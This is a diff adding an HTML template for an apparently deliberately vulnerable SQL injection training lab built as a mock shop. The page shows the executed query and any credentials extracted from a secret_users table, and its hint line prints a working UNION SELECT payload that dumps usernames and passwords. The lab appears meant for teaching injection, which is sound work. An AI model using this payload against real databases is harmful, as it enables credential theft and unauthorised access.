@@ -1,0 +1,41 @@
+{% extends "base.html" %}
+{% block title %}Lab 6 – Retrieve Multiple Values in One Column{% endblock %}
+{% block content %}
+<h2>WE LIKE TO SHOP 🛒</h2>
+<form method="GET" action="/lab6" style="margin-bottom: 20px;">
+    <input type="text" name="category" placeholder="Filter by category" value="{{ request.args.get('category', '') }}" style="width: 70%;">
+    <button type="submit">Filter</button>
+</form>
+
+<div class="query">Query: <code>{{ query }}</code></div>
+
+{% if extracted_creds %}
+    <!-- Only show credentials, no product cards -->
+    <div style="margin-top: 20px; padding: 20px; background: #f0fdf4; border-radius: 8px; border-left: 4px solid #28a745;">
+        <h3 style="margin-top: 0;">🔑 Extracted credentials</h3>
+        <p>The query has returned the following usernames and passwords from the <code>secret_users</code> table:</p>
+        <ul style="background: #fff; padding: 15px; border-radius: 6px;">
+            {% for cred in extracted_creds %}
+                <li><strong>{{ cred.username }}</strong> : <code>{{ cred.password }}</code></li>
+            {% endfor %}
+        </ul>
+        <p>Use the <strong>administrator</strong> credentials to log in and solve the lab.</p>
+        <a href="/lab6/verify" class="button" style="background: #28a745; color: white; padding: 8px 16px; text-decoration: none; border-radius: 4px; display: inline-block;">Go to login page →</a>
+    </div>
+{% else %}
+    <!-- Normal product listing (no injection yet) -->
+    <div class="products">
+        {% for row in results %}
+        <div class="product">
+            <h3>{{ row.name if row.name else 'Product' }}</h3>
+            <div class="price">${{ row.price }}</div>
+            <p>High-quality item for your daily needs.</p>
+            <a href="#">View details</a>
+        </div>
+        {% else %}
+        <p>No products found.</p>
+        {% endfor %}
+    </div>
+    <p><em>💡 Payload: <code>' UNION SELECT NULL,username||':'||password FROM secret_users--</code></em></p>
+{% endif %}
+{% endblock %}
